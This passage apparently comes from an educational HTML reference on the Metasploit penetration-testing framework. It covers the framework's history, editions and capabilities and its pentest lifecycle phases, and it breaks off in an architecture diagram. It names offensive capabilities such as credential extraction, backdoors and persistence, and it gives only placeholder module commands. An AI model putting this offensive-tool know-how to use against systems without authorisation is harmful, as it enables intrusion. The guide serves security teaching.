@@ -1,0 +1,1537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Metasploit Framework — Deep Dive Reference</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Russo+One&family=Ubuntu+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#030508;--s1:#05080d;--s2:#070c14;--card:#080d18;--border:#112240;
+  --red:#ff2e2e;--red2:#ff6b6b;--orange:#ff7b00;--yellow:#ffd60a;
+  --green:#39d353;--teal:#0af5d0;--cyan:#00cfff;--blue:#1e90ff;
+  --violet:#bd93f9;--pink:#ff79c6;--white:#f8f8f2;--text:#6e8ca8;--muted:#0d2540;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;min-height:100vh;overflow-x:hidden;}
+
+#matrix-bg{position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.18;}
+
+/* ── LEGAL BANNER ── */
+.legal-banner{
+  position:relative;z-index:20;
+  background:rgba(255,46,46,.1);border-bottom:1px solid var(--red);
+  padding:10px 20px;text-align:center;
+  font-size:.72rem;color:var(--red2);letter-spacing:.08em;
+}
+.legal-banner strong{color:var(--red);}
+
+/* ── HEADER ── */
+.hdr{position:relative;z-index:10;text-align:center;padding:32px 24px 20px;border-bottom:1px solid var(--border);background:linear-gradient(180deg,rgba(3,5,8,1) 0%,transparent 100%);overflow:hidden;}
+.hdr::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 50% -10%,rgba(255,46,46,.1) 0%,transparent 60%);}
+.hdr .kicker{font-family:'Ubuntu Mono',monospace;font-size:.6rem;letter-spacing:.45em;color:#330a0a;text-transform:uppercase;margin-bottom:10px;}
+.hdr h1{font-family:'Russo One',sans-serif;font-size:clamp(1.6rem,5vw,3rem);line-height:1;background:linear-gradient(135deg,var(--red) 0%,var(--orange) 45%,var(--yellow) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;filter:drop-shadow(0 0 30px rgba(255,46,46,.4));letter-spacing:.06em;}
+.hdr .sub{font-size:.76rem;color:var(--text);letter-spacing:.2em;margin-top:8px;}
+.hdr-stats{display:flex;justify-content:center;gap:24px;margin-top:14px;flex-wrap:wrap;}
+.hdr-stat{font-family:'Ubuntu Mono',monospace;font-size:.6rem;color:var(--muted);display:flex;flex-direction:column;align-items:center;gap:2px;}
+.hdr-stat span{color:var(--red);font-size:.85rem;font-weight:700;}
+
+/* ── TABS ── */
+.tabs{position:sticky;top:0;z-index:100;background:rgba(3,5,8,.97);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);overflow-x:auto;scrollbar-width:none;}
+.tabs::-webkit-scrollbar{display:none}
+.tab-row{display:flex;min-width:max-content;}
+.tab{font-family:'Ubuntu Mono',monospace;font-size:.6rem;letter-spacing:.08em;padding:13px 18px;background:none;border:none;border-bottom:2px solid transparent;color:var(--muted);cursor:pointer;transition:all .2s;white-space:nowrap;display:flex;align-items:center;gap:7px;}
+.tab:hover{color:var(--white);}
+.tab.on{color:var(--red);border-bottom-color:var(--red);}
+.tab .tnum{width:18px;height:18px;border-radius:3px;background:var(--border);display:flex;align-items:center;justify-content:center;font-size:.55rem;color:var(--muted);}
+.tab.on .tnum{background:var(--red);color:var(--bg);}
+
+/* ── PANELS ── */
+.panel{display:none;position:relative;z-index:1;}
+.panel.on{display:block;}
+
+/* ── LAYOUT ── */
+.wrap{max-width:1300px;margin:0 auto;padding:24px 20px 52px;}
+.two-col{display:grid;grid-template-columns:1fr 330px;gap:20px;align-items:start;}
+.three-col{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;}
+.two-even{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+@media(max-width:960px){.two-col{grid-template-columns:1fr;}.three-col{grid-template-columns:1fr 1fr;}}
+@media(max-width:560px){.three-col,.two-even{grid-template-columns:1fr;}}
+
+/* ── SECTION HEAD ── */
+.sec{margin-bottom:20px;}
+.sec .tag{font-family:'Ubuntu Mono',monospace;font-size:.57rem;letter-spacing:.4em;color:#330a0a;text-transform:uppercase;margin-bottom:6px;}
+.sec h2{font-family:'Russo One',sans-serif;font-size:clamp(1rem,2.5vw,1.6rem);color:var(--white);margin-bottom:8px;letter-spacing:.04em;}
+.sec p{font-size:.79rem;color:var(--text);line-height:1.75;max-width:720px;}
+
+/* ── BOX ── */
+.box{background:var(--card);border:1px solid var(--border);border-radius:5px;margin-bottom:16px;overflow:hidden;box-shadow:0 4px 30px rgba(0,0,0,.6);}
+.box-title{font-family:'Ubuntu Mono',monospace;font-size:.57rem;letter-spacing:.28em;padding:9px 14px;border-bottom:1px solid var(--border);color:var(--red2);text-transform:uppercase;display:flex;align-items:center;gap:8px;}
+.box-title .pip{width:6px;height:6px;border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--red);animation:redpip 2s ease infinite;}
+@keyframes redpip{0%,100%{opacity:1;box-shadow:0 0 6px var(--red)}50%{opacity:.3;box-shadow:none}}
+.box svg{display:block;width:100%;height:auto;}
+
+/* ── CARDS ── */
+.card{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:13px 15px;border-left:3px solid var(--cl,var(--red));transition:all .2s;}
+.card:hover{background:var(--s2);transform:translateY(-1px);box-shadow:0 6px 22px rgba(0,0,0,.5);}
+.card h4{font-family:'Ubuntu Mono',monospace;font-size:.57rem;letter-spacing:.18em;text-transform:uppercase;color:var(--cl,var(--red));margin-bottom:6px;}
+.card p{font-size:.75rem;color:var(--text);line-height:1.7;}
+.card code{color:var(--red);background:rgba(255,46,46,.08);padding:1px 5px;border-radius:3px;font-family:'Ubuntu Mono',monospace;font-size:.82em;}
+.card-stack{display:flex;flex-direction:column;gap:10px;}
+.badge{display:inline-block;margin-top:6px;background:rgba(0,0,0,.4);border:1px solid var(--cl,var(--red));border-radius:3px;padding:2px 9px;font-family:'Ubuntu Mono',monospace;font-size:.57rem;color:var(--cl,var(--red));letter-spacing:.08em;}
+
+/* ── TERMINAL ── */
+.terminal{background:#020305;border:1px solid var(--border);border-radius:5px;overflow:hidden;margin-bottom:16px;font-family:'Ubuntu Mono',monospace;}
+.term-bar{background:#0d1829;padding:8px 14px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border);}
+.term-dot{width:11px;height:11px;border-radius:50%;}
+.term-title{font-size:.6rem;color:var(--muted);letter-spacing:.2em;margin-left:8px;}
+.term-body{padding:16px;font-size:.76rem;line-height:1.95;overflow-x:auto;}
+.term-body pre{white-space:pre;}
+.p{color:var(--red);} /* prompt */
+.c{color:#e0e0e0;}  /* command */
+.o{color:var(--green);} /* output */
+.o2{color:var(--teal);}  /* special output */
+.o3{color:var(--yellow);} /* warning */
+.o4{color:var(--red2);}   /* error/hit */
+.o5{color:var(--violet);}  /* info */
+.o6{color:var(--cyan);}    /* session */
+.cm2{color:#3a5070;font-style:italic;} /* comment */
+.hl2{background:rgba(255,46,46,.07);display:block;border-left:2px solid var(--red);padding-left:6px;}
+
+/* ── MODULE CARD ── */
+.mod-card{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:12px 14px;border-top:2px solid var(--mc,var(--red));transition:all .2s;cursor:default;}
+.mod-card:hover{background:var(--s2);box-shadow:0 0 16px rgba(255,46,46,.07);}
+.mod-card .mc-type{font-family:'Ubuntu Mono',monospace;font-size:.55rem;letter-spacing:.2em;text-transform:uppercase;color:var(--mc,var(--red));margin-bottom:5px;}
+.mod-card .mc-name{font-weight:700;color:var(--white);font-size:.85rem;margin-bottom:4px;}
+.mod-card .mc-path{font-family:'Ubuntu Mono',monospace;font-size:.6rem;color:var(--muted);margin-bottom:8px;}
+.mod-card .mc-desc{font-size:.72rem;color:var(--text);line-height:1.6;}
+.mod-card .mc-tag{display:inline-block;background:rgba(255,46,46,.08);border:1px solid rgba(255,46,46,.2);border-radius:2px;padding:1px 7px;font-size:.58rem;color:var(--red2);margin:2px;font-family:'Ubuntu Mono',monospace;}
+
+/* ── PAYLOAD TABLE ── */
+.pay-table{width:100%;border-collapse:collapse;font-size:.72rem;}
+.pay-table th{background:var(--s1);color:var(--red2);padding:8px 12px;text-align:left;font-family:'Ubuntu Mono',monospace;font-size:.57rem;letter-spacing:.15em;border-bottom:1px solid var(--border);}
+.pay-table td{padding:8px 12px;border-bottom:1px solid rgba(17,34,64,.6);vertical-align:top;}
+.pay-table tr:hover td{background:rgba(255,46,46,.02);}
+.pay-table .pname{color:var(--orange);font-family:'Ubuntu Mono',monospace;font-weight:700;}
+.pay-table .pgood{color:var(--green);}
+.pay-table .pinfo{color:var(--cyan);}
+
+/* ── FLOW DIAGRAM ── */
+.flow-step{display:flex;align-items:center;gap:0;flex-wrap:wrap;}
+
+/* ── ANIMATIONS ── */
+@keyframes fadeup{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+@keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
+@keyframes blink-cursor{0%,100%{opacity:1}50%{opacity:0}}
+@keyframes data-travel{0%{stroke-dashoffset:300}100%{stroke-dashoffset:0}}
+@keyframes exploit-pulse{0%,100%{box-shadow:0 0 5px var(--red)}50%{box-shadow:0 0 20px var(--red),0 0 40px rgba(255,46,46,.3)}}
+
+.cursor-blink{animation:blink-cursor 1s step-end infinite;}
+.panel.on .box{animation:fadeup .3s ease both;}
+.panel.on .card,.panel.on .mod-card,.panel.on .terminal{animation:fadeup .3s ease both;}
+
+/* ── RANK BADGES ── */
+.rank{display:inline-block;padding:2px 8px;border-radius:2px;font-size:.58rem;font-family:'Ubuntu Mono',monospace;letter-spacing:.08em;}
+.rank.excellent{background:rgba(57,211,83,.15);color:var(--green);border:1px solid rgba(57,211,83,.3);}
+.rank.great{background:rgba(0,207,255,.12);color:var(--cyan);border:1px solid rgba(0,207,255,.25);}
+.rank.good{background:rgba(255,123,0,.12);color:var(--orange);border:1px solid rgba(255,123,0,.25);}
+.rank.normal{background:rgba(110,140,168,.12);color:var(--text);border:1px solid rgba(110,140,168,.2);}
+.rank.manual{background:rgba(255,46,46,.1);color:var(--red);border:1px solid rgba(255,46,46,.2);}
+
+/* ── METERPRETER COMMANDS ── */
+.mtr-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;padding:14px;}
+@media(max-width:600px){.mtr-grid{grid-template-columns:1fr;}}
+.mtr-section{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:4px;padding:10px 12px;}
+.mtr-section h5{font-family:'Ubuntu Mono',monospace;font-size:.58rem;letter-spacing:.2em;color:var(--red2);text-transform:uppercase;margin-bottom:8px;border-bottom:1px solid var(--border);padding-bottom:5px;}
+.mtr-cmd{font-family:'Ubuntu Mono',monospace;font-size:.7rem;padding:3px 0;display:flex;gap:10px;}
+.mtr-cmd .cmd{color:var(--green);min-width:140px;}
+.mtr-cmd .desc{color:#3a5070;font-size:.66rem;}
+</style>
+</head>
+<body>
+<canvas id="matrix-bg"></canvas>
+
+<!-- Legal Banner -->
+<div class="legal-banner">
+  ⚠ <strong>EDUCATIONAL USE ONLY</strong> — Metasploit must ONLY be used on systems you own or have <strong>explicit written authorisation</strong> to test. Unauthorised use is illegal under the Computer Misuse Act, CFAA, and equivalent laws worldwide. This guide is for <strong>ethical penetration testing, CTFs, and security research</strong>.
+</div>
+
+<header class="hdr">
+  <div class="kicker">Penetration Testing Framework — Ethical Hacking Reference</div>
+  <h1>METASPLOIT FRAMEWORK</h1>
+  <p class="sub">The World's Most Used Penetration Testing Tool — Deep Technical Guide</p>
+  <div class="hdr-stats">
+    <div class="hdr-stat"><span>2003</span>Created by HD Moore</div>
+    <div class="hdr-stat"><span>2,350+</span>Exploit Modules</div>
+    <div class="hdr-stat"><span>Ruby</span>Core Language</div>
+    <div class="hdr-stat"><span>Kali Linux</span>Pre-installed</div>
+    <div class="hdr-stat"><span>Open Source</span>+ Pro Edition</div>
+  </div>
+</header>
+
+<nav class="tabs">
+  <div class="tab-row">
+    <button class="tab on" onclick="go('intro',this)"><span class="tnum">1</span>Introduction</button>
+    <button class="tab"    onclick="go('arch',this)"><span class="tnum">2</span>Architecture</button>
+    <button class="tab"    onclick="go('setup',this)"><span class="tnum">3</span>Setup & msfconsole</button>
+    <button class="tab"    onclick="go('modules',this)"><span class="tnum">4</span>Modules</button>
+    <button class="tab"    onclick="go('payloads',this)"><span class="tnum">5</span>Payloads & Shellcode</button>
+    <button class="tab"    onclick="go('meterpreter',this)"><span class="tnum">6</span>Meterpreter</button>
+    <button class="tab"    onclick="go('workflow',this)"><span class="tnum">7</span>Pentest Workflow</button>
+    <button class="tab"    onclick="go('auxpost',this)"><span class="tnum">8</span>Auxiliary & Post</button>
+    <button class="tab"    onclick="go('evasion',this)"><span class="tnum">9</span>Evasion & Encoding</button>
+    <button class="tab"    onclick="go('ethics',this)"><span class="tnum">10</span>Ethics & Law</button>
+  </div>
+</nav>
+
+<!-- ═══════════════════════════
+  1 — INTRODUCTION
+═══════════════════════════ -->
+<div id="p-intro" class="panel on">
+<div class="wrap">
+  <div class="sec">
+    <div class="tag">Chapter 1 — Foundation</div>
+    <h2>What is the Metasploit Framework?</h2>
+    <p>The Metasploit Framework (MSF) is the world's most widely used open-source penetration testing platform. It provides a structured environment for developing, testing, and executing <strong style="color:var(--red)">exploit code</strong> against remote target systems. Used by security professionals, red teams, and researchers to identify vulnerabilities before attackers do.</p>
+  </div>
+
+  <div class="box">
+    <div class="box-title"><div class="pip"></div>HOW METASPLOIT FITS IN THE PENTEST LIFECYCLE</div>
+    <svg viewBox="0 0 860 200" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <filter id="rg"><feGaussianBlur stdDeviation="5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+        <marker id="ra" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M0,0 L10,5 L0,10z" fill="#ff2e2e" opacity=".8"/></marker>
+      </defs>
+      <rect width="860" height="200" fill="#020305"/>
+      <!-- 6 phase boxes -->
+      <g font-family="Ubuntu Mono,monospace">
+        <!-- 1 Recon -->
+        <rect x="12" y="30" width="120" height="110" rx="4" fill="rgba(110,140,168,.06)" stroke="rgba(110,140,168,.3)" stroke-width="1.3"/>
+        <text x="72" y="58" text-anchor="middle" font-size="18">🔍</text>
+        <text x="72" y="78" text-anchor="middle" font-size="9" fill="#6e8ca8">RECON</text>
+        <text x="72" y="93" text-anchor="middle" font-size="7.5" fill="#0d2540">Nmap, OSINT</text>
+        <text x="72" y="106" text-anchor="middle" font-size="7.5" fill="#0d2540">Shodan, WHOIS</text>
+        <text x="72" y="125" text-anchor="middle" font-size="7" fill="#6e8ca8">MSF: db_nmap</text>
+
+        <path d="M134,85 L152,85" fill="none" stroke="#ff2e2e" stroke-width="1.5" marker-end="url(#ra)" stroke-dasharray="4 3"><animate attributeName="stroke-dashoffset" values="0;-28" dur="1.5s" repeatCount="indefinite"/></path>
+
+        <!-- 2 Scanning -->
+        <rect x="154" y="30" width="120" height="110" rx="4" fill="rgba(110,140,168,.06)" stroke="rgba(110,140,168,.3)" stroke-width="1.3"/>
+        <text x="214" y="58" text-anchor="middle" font-size="18">📡</text>
+        <text x="214" y="78" text-anchor="middle" font-size="9" fill="#6e8ca8">SCANNING</text>
+        <text x="214" y="93" text-anchor="middle" font-size="7.5" fill="#0d2540">Port scan</text>
+        <text x="214" y="106" text-anchor="middle" font-size="7.5" fill="#0d2540">Service detect</text>
+        <text x="214" y="125" text-anchor="middle" font-size="7" fill="#6e8ca8">MSF: auxiliary</text>
+
+        <path d="M276,85 L294,85" fill="none" stroke="#ff2e2e" stroke-width="1.5" marker-end="url(#ra)" stroke-dasharray="4 3"><animate attributeName="stroke-dashoffset" values="0;-28" dur="1.5s" repeatCount="indefinite" begin="-0.3s"/></path>
+
+        <!-- 3 Exploitation -->
+        <rect x="296" y="20" width="128" height="130" rx="4" fill="rgba(255,46,46,.08)" stroke="#ff2e2e" stroke-width="2" filter="url(#rg)"/>
+        <text x="360" y="50" text-anchor="middle" font-size="22">💥</text>
+        <text x="360" y="74" text-anchor="middle" font-size="10" fill="#ff2e2e" font-weight="700">EXPLOITATION</text>
+        <text x="360" y="92" text-anchor="middle" font-size="8" fill="#ff6b6b">use exploit/...</text>
+        <text x="360" y="107" text-anchor="middle" font-size="8" fill="#ff6b6b">set PAYLOAD</text>
+        <text x="360" y="120" text-anchor="middle" font-size="8" fill="#ff6b6b">set RHOSTS</text>
+        <text x="360" y="133" text-anchor="middle" font-size="8" fill="#ff2e2e">run / exploit</text>
+        <text x="360" y="148" text-anchor="middle" font-size="7.5" fill="#330a0a">★ CORE MSF USE</text>
+        <!-- Pulse ring -->
+        <circle cx="360" cy="90" r="60" fill="none" stroke="#ff2e2e" stroke-width="1" opacity="0">
+          <animate attributeName="r" values="60;100" dur="2s" repeatCount="indefinite"/>
+          <animate attributeName="opacity" values=".5;0" dur="2s" repeatCount="indefinite"/>
+        </circle>
+
+        <path d="M426,85 L444,85" fill="none" stroke="#ff2e2e" stroke-width="1.5" marker-end="url(#ra)" stroke-dasharray="4 3"><animate attributeName="stroke-dashoffset" values="0;-28" dur="1.5s" repeatCount="indefinite" begin="-0.6s"/></path>
+
+        <!-- 4 Post-Exploitation -->
+        <rect x="446" y="30" width="120" height="110" rx="4" fill="rgba(255,123,0,.07)" stroke="rgba(255,123,0,.4)" stroke-width="1.5"/>
+        <text x="506" y="58" text-anchor="middle" font-size="18">🎯</text>
+        <text x="506" y="76" text-anchor="middle" font-size="9" fill="#ff7b00">POST-EXPLOIT</text>
+        <text x="506" y="92" text-anchor="middle" font-size="7.5" fill="#4d2400">Privilege escalation</text>
+        <text x="506" y="105" text-anchor="middle" font-size="7.5" fill="#4d2400">Pivoting, loot</text>
+        <text x="506" y="125" text-anchor="middle" font-size="7" fill="#ff7b00">MSF: post/...</text>
+
+        <path d="M568,85 L586,85" fill="none" stroke="#ff2e2e" stroke-width="1.5" marker-end="url(#ra)" stroke-dasharray="4 3"><animate attributeName="stroke-dashoffset" values="0;-28" dur="1.5s" repeatCount="indefinite" begin="-0.9s"/></path>
+
+        <!-- 5 Persistence -->
+        <rect x="588" y="30" width="120" height="110" rx="4" fill="rgba(189,147,249,.07)" stroke="rgba(189,147,249,.35)" stroke-width="1.3"/>
+        <text x="648" y="58" text-anchor="middle" font-size="18">👻</text>
+        <text x="648" y="78" text-anchor="middle" font-size="9" fill="#bd93f9">PERSISTENCE</text>
+        <text x="648" y="93" text-anchor="middle" font-size="7.5" fill="#2d1f5e">Backdoors</text>
+        <text x="648" y="106" text-anchor="middle" font-size="7.5" fill="#2d1f5e">Scheduled tasks</text>
+        <text x="648" y="125" text-anchor="middle" font-size="7" fill="#bd93f9">MSF: post/persist</text>
+
+        <path d="M710,85 L728,85" fill="none" stroke="#ff2e2e" stroke-width="1.5" marker-end="url(#ra)" stroke-dasharray="4 3"><animate attributeName="stroke-dashoffset" values="0;-28" dur="1.5s" repeatCount="indefinite" begin="-1.2s"/></path>
+
+        <!-- 6 Reporting -->
+        <rect x="730" y="30" width="118" height="110" rx="4" fill="rgba(57,211,83,.06)" stroke="rgba(57,211,83,.25)" stroke-width="1.2"/>
+        <text x="789" y="58" text-anchor="middle" font-size="18">📝</text>
+        <text x="789" y="78" text-anchor="middle" font-size="9" fill="#39d353">REPORTING</text>
+        <text x="789" y="93" text-anchor="middle" font-size="7.5" fill="#0d3b1a">Findings doc</text>
+        <text x="789" y="106" text-anchor="middle" font-size="7.5" fill="#0d3b1a">Remediation</text>
+        <text x="789" y="125" text-anchor="middle" font-size="7" fill="#39d353">MSF: db report</text>
+
+        <!-- Bottom label -->
+        <text x="430" y="182" text-anchor="middle" font-size="8" fill="#0d2540">Metasploit covers ALL phases: Recon (db_nmap) → Scan (auxiliary) → Exploit → Post → Persist → Report (workspace)</text>
+      </g>
+    </svg>
+  </div>
+
+  <div class="two-col">
+  <div>
+  <div class="box">
+    <div class="box-title"><div class="pip"></div>BRIEF HISTORY OF METASPLOIT</div>
+    <div style="padding:16px;display:flex;flex-direction:column;gap:10px;">
+      <div style="display:flex;gap:12px;align-items:start">
+        <div style="min-width:42px;font-family:'Ubuntu Mono';font-size:.65rem;color:var(--red);text-align:right">2003</div>
+        <div style="font-size:.73rem;color:var(--text);line-height:1.6">HD Moore releases <span style="color:var(--orange)">Metasploit 1.0</span> in Perl — 11 exploits. Originally created to make exploit development easier for security researchers.</div>
+      </div>
+      <div style="display:flex;gap:12px;align-items:start">
+        <div style="min-width:42px;font-family:'Ubuntu Mono';font-size:.65rem;color:var(--red);text-align:right">2004</div>
+        <div style="font-size:.73rem;color:var(--text);line-height:1.6">V2.0 released at DEF CON. Rewritten in <span style="color:var(--orange)">C and Perl</span>. 20 exploits. Shell grew from hacker curiosity to respected security tool.</div>
+      </div>
+      <div style="display:flex;gap:12px;align-items:start">
+        <div style="min-width:42px;font-family:'Ubuntu Mono';font-size:.65rem;color:var(--red);text-align:right">2007</div>
+        <div style="font-size:.73rem;color:var(--text);line-height:1.6">V3.0 — <span style="color:var(--yellow)">Complete rewrite in Ruby</span>. Plugin architecture introduced. Meterpreter payload reimplemented. 177 exploits, 104 payloads.</div>
+      </div>
+      <div style="display:flex;gap:12px;align-items:start">
+        <div style="min-width:42px;font-family:'Ubuntu Mono';font-size:.65rem;color:var(--red);text-align:right">2009</div>
+        <div style="font-size:.73rem;color:var(--text);line-height:1.6"><span style="color:var(--violet)">Rapid7 acquires Metasploit</span>. HD Moore joins Rapid7. Commercial editions (Pro, Express, Community) launched alongside the free Framework.</div>
+      </div>
+      <div style="display:flex;gap:12px;align-items:start">
+        <div style="min-width:42px;font-family:'Ubuntu Mono';font-size:.65rem;color:var(--red);text-align:right">2011</div>
+        <div style="font-size:.73rem;color:var(--text);line-height:1.6">V4.0 — <span style="color:var(--teal)">PostgreSQL database integration</span>. Workspaces, tags, and data management. msfconsole becomes the primary interface.</div>
+      </div>
+      <div style="display:flex;gap:12px;align-items:start">
+        <div style="min-width:42px;font-family:'Ubuntu Mono';font-size:.65rem;color:var(--red);text-align:right">2019+</div>
+        <div style="font-size:.73rem;color:var(--text);line-height:1.6">Metasploit 6 — <span style="color:var(--green)">SMBv3 support, encrypted sessions</span>, evasion modules, improved Meterpreter. Now 2,350+ exploit modules. Industry standard for professional pentesting.</div>
+      </div>
+    </div>
+  </div>
+  </div>
+
+  <div class="card-stack">
+    <div class="card" style="--cl:var(--red)"><h4>Editions Comparison</h4>
+      <p><code>Framework</code> — Free, open-source, CLI-only<br>
+      <code>Community</code> — Free, limited web UI<br>
+      <code>Express</code> — Paid, automated testing<br>
+      <code>Pro</code> — Full commercial, phishing, reporting, team collab<br><br>
+      99% of users use the free Framework. This guide covers Framework entirely.</p>
+    </div>
+    <div class="card" style="--cl:var(--orange)"><h4>What MSF Can Do</h4>
+      <p>• Find and exploit known vulnerabilities<br>
+      • Generate and deliver payloads<br>
+      • Open interactive shells on targets<br>
+      • Escalate privileges<br>
+      • Pivot through networks<br>
+      • Extract credentials and hashes<br>
+      • Test web application vulnerabilities<br>
+      • Scan and enumerate services</p>
+    </div>
+    <div class="card" style="--cl:var(--green)"><h4>Who Uses Metasploit?</h4>
+      <p><code>Red Teams</code>: simulate real attacks to test defences<br>
+      <code>Pentesters</code>: authorised security assessments<br>
+      <code>CTF Players</code>: Capture The Flag competitions<br>
+      <code>Security Researchers</code>: vulnerability discovery<br>
+      <code>Students</code>: learning offensive security (OSCP)<br>
+      <code>Blue Teams</code>: test their own detection rules</p>
+    </div>
+  </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════
+  2 — ARCHITECTURE
+═══════════════════════════ -->
+<div id="p-arch" class="panel">
+<div class="wrap">
+  <div class="sec">
+    <div class="tag">Chapter 2 — Internals</div>
+    <h2>Metasploit Architecture — How It's Built</h2>
+    <p>Metasploit is built in <strong style="color:var(--red)">Ruby</strong> using a clean layered architecture. Understanding the internals helps you write custom modules, understand why things work, and troubleshoot complex scenarios.</p>
+  </div>
+
+  <div class="box">
+    <div class="box-title"><div class="pip"></div>MSF ARCHITECTURE DIAGRAM — FULL STACK</div>
+    <svg viewBox="0 0 860 380" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <filter id="ag"><feGaussianBlur stdDeviation="5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+        <filter id="ag2"><feGaussianBlur stdDeviation="8" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+        <marker id="aa" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M0,0 L10,5 L0,10z" fill="#ff2e2e" opacity=".7"/></marker>
+      </defs>
+      <rect width="860" height="380" fill="#020305"/>
+
+      <!-- INTERFACES (top) -->
+      <rect x="20" y="12" width="820" height="50" rx="4" fill="rgba(189,147,249,.06)" stroke="rgba(189,147,249,.3)" stroke-width="1.3"/>
+      <text x="430" y="30" text-anchor="middle" font-family="Russo One" font-size="11" fill="#bd93f9" letter-spacing="2">INTERFACES</text>
+      <text x="160" y="48" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#4a2080">msfconsole</text>
+      <text x="310" y="48" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#4a2080">msfvenom</text>
+      <text x="460" y="48" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#4a2080">msfdb</text>
+      <text x="610" y="48" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#4a2080">Armitage (GUI)</text>
+      <text x="760" y="48" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#4a2080">REST API</text>
+
+      <!-- Arrow down -->
+      <line x1="430" y1="64" x2="430" y2="82" stroke="rgba(255,46,46,.4)" stroke-width="1.3" marker-end="url(#aa)"/>
+
+      <!-- REX / Framework Core -->
+      <rect x="20" y="85" width="820" height="55" rx="4" fill="rgba(255,46,46,.07)" stroke="#ff2e2e" stroke-width="1.8" filter="url(#ag)"/>
+      <text x="430" y="106" text-anchor="middle" font-family="Russo One" font-size="11" fill="#ff2e2e" letter-spacing="2">FRAMEWORK CORE</text>
+      <text x="150" y="124" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#ff6b6b">Rex (Ruby Extensions)</text>
+      <text x="330" y="124" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#ff6b6b">Module Manager</text>
+      <text x="510" y="124" text-family="Ubuntu Mono" font-size="8" fill="#ff6b6b" font-family="Ubuntu Mono" text-anchor="middle">Plugin System</text>
+      <text x="690" y="124" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#ff6b6b">Event Dispatcher</text>
+
+      <line x1="430" y1="142" x2="430" y2="160" stroke="rgba(255,46,46,.4)" stroke-width="1.3" marker-end="url(#aa)"/>
+
+      <!-- Modules layer -->
+      <text x="430" y="176" text-anchor="middle" font-family="Russo One" font-size="10" fill="#ff7b00" letter-spacing="3">MODULES</text>
+      <g>
+        <!-- 6 module type boxes -->
+        <rect x="22" y="183" width="120" height="70" rx="4" fill="rgba(255,46,46,.07)" stroke="rgba(255,46,46,.35)" stroke-width="1.3" filter="url(#ag)"/>
+        <text x="82" y="203" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#ff2e2e">EXPLOITS</text>
+        <text x="82" y="217" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#330a0a">Remote · Local</text>
+        <text x="82" y="230" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#330a0a">Client-side · Web</text>
+        <text x="82" y="244" text-anchor="middle" font-family="Ubuntu Mono" font-size="7" fill="#ff2e2e">exploit/*</text>
+
+        <rect x="158" y="183" width="120" height="70" rx="4" fill="rgba(255,123,0,.07)" stroke="rgba(255,123,0,.35)" stroke-width="1.3"/>
+        <text x="218" y="203" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#ff7b00">PAYLOADS</text>
+        <text x="218" y="217" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#4d2400">Singles · Stagers</text>
+        <text x="218" y="230" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#4d2400">Stages · Meter.</text>
+        <text x="218" y="244" text-anchor="middle" font-family="Ubuntu Mono" font-size="7" fill="#ff7b00">payload/*</text>
+
+        <rect x="294" y="183" width="120" height="70" rx="4" fill="rgba(255,214,10,.07)" stroke="rgba(255,214,10,.3)" stroke-width="1.3"/>
+        <text x="354" y="203" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#ffd60a">AUXILIARY</text>
+        <text x="354" y="217" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#4d3f00">Scanners · Fuzzers</text>
+        <text x="354" y="230" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#4d3f00">DoS · Spoofers</text>
+        <text x="354" y="244" text-anchor="middle" font-family="Ubuntu Mono" font-size="7" fill="#ffd60a">auxiliary/*</text>
+
+        <rect x="430" y="183" width="120" height="70" rx="4" fill="rgba(57,211,83,.07)" stroke="rgba(57,211,83,.3)" stroke-width="1.3"/>
+        <text x="490" y="203" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#39d353">POST</text>
+        <text x="490" y="217" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#0d3b1a">Gather · Manage</text>
